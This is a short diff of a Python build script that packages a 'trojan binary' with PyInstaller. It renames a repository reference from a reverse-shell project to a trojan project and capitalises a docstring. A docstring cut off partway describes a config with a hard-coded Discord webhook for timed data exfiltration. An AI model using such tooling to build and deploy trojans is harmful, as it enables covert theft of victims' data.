@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# https://github.com/EONRaider/BCA-HTTPS-Reverse-Shell
+# https://github.com/EONRaider/BCA-Trojan
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
@@ -12,7 +12,7 @@ import PyInstaller.__main__
 
 def build(args: argparse.Namespace) -> None:
     """Set-up the arguments required by PyInstaller to build the
-    trojan binary."""
+    Trojan binary."""
 
     '''A configuration file named 'trojan.cfg' is created with a 
     hard-coded Discord Webhook URL and exfiltration time setting that 
